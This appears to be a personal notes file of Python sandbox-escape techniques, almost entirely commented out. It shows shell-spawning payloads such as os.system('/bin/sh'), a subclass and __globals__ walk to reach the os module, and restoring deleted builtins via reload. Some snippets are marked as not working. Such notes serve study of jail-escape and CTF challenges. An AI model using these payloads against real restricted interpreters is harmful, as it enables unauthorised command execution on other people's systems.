# import sys
# import os

# call /bin/sh directly via os
# os.execv('/bin/sh', (' ',))
# sys.modules['os'].system('/bin/sh')
# eval("__import__('os').system('/bin/sh')")

# execute code from other file
# exec(open('shell.py').read())
# way without exec (compiling)
"""
this way is not working
# local
def read():
    return open('./shell.py', 'r').read()
compiledCode = read.__code__.co_code

# remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) # Get <type 'type'>
consts = (None, './shell.py', 'r')
bytecode = compiledCode
names = ('open', 'read')
# exec compiled code via eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))
"""

"""
# use dir to get properties
print(dir(__builtins__))

# get base class of an obj
print ([].__class__.__bases__[0])
print ([].__class__.__mro__[-1])

# get specific method of base class
print([].__class__.__dict__['append'])
# add element to a via method of base class
a = []
[].__class__.__dict__['append'](a, 'firstEle')
print(a)

# get subclasses of object (here the second last one)
print([].__class__.__base__.__subclasses__()[-2])
# get functions of this base class and locate __init__
print(dir([].__class__.__base__.__subclasses__()[-2]))
print([].__class__.__base__.__subclasses__()[-2].__init__)
print(dir([].__class__.__base__.__subclasses__()[-2].__init__))
# get properties of globals
print([].__class__.__base__.__subclasses__()[-2].__init__.__getattribute__('__globals__'))

# add more elements
a.__getattribute__('append')('secondEle')
a.__class__.append(a, 'thirdEle')
# print(a)

# combine both methods
# test if init method is present
print([].__class__.__dict__['__init__'])
# get access to init method
print([].__class__.__getattribute__([], '__init__'))
# get properties of __init__
print(dir([].__class__.__base__.__subclasses__()[-2].__init__))
# access sys module via globals attrib of init
[].__class__.__base__.__subclasses__()[-2].__init__.__globals__['sys'].modules['os'].system('/bin/sh')

escaping_function = lambda x:x+1
# get attribs of function
print(dir(escaping_function))
# call eval with proper import via builtins module
escaping_function.__globals__['__builtins__'].eval("__import__('os').system('/bin/sh')")
"""

"""
# fcts can be deleted
del __builtins__.__dict__['eval']
# eval("__import__('os').system('/bin/sh')")

# calling reload restores deleted functions
import imp
imp.reload(__builtins__)
eval("__import__('os').system('/bin/sh')")
# not working
"""